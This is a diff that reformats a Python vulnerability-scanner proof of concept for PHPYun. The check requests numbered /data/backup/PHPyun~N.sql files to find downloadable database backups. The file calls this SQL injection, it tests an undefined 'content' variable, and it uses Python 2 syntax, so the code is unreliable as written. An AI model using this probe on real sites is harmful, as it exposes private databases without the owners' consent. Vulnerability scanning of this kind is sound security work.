@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPYun_0003' # 平台漏洞编号，留空
+    vuln_id = 'PHPYun_0003'  # 平台漏洞编号，留空
     name = 'PHPYun SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-02-15'  # 漏洞公布时间
     desc = '''
         PHPYun /data/backup/PHPyun~%d.sql SQL注入漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PHPYun'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '8d365be4-5bea-4299-acaa-208fcb1bac6a'
@@ -30,26 +32,27 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-096528
-            #可下载数据库备份
-            for i in range(1,10):
+
+            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2010-096528
+            # 可下载数据库备份
+            for i in range(1, 10):
                 payload = "/data/backup/PHPyun~%d.sql" % i
                 target = self.target + payload
                 #code, head, body, errcode, final_url = curl.curl2(target);
                 r = requests.get(target)
 
                 if r.status_code == 200 and '#dbname:' in r.content and 'CREATE TABLE' in content:
-                    #security_warning(target)
+                    # security_warning(target)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
-                    break         
+                    break
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
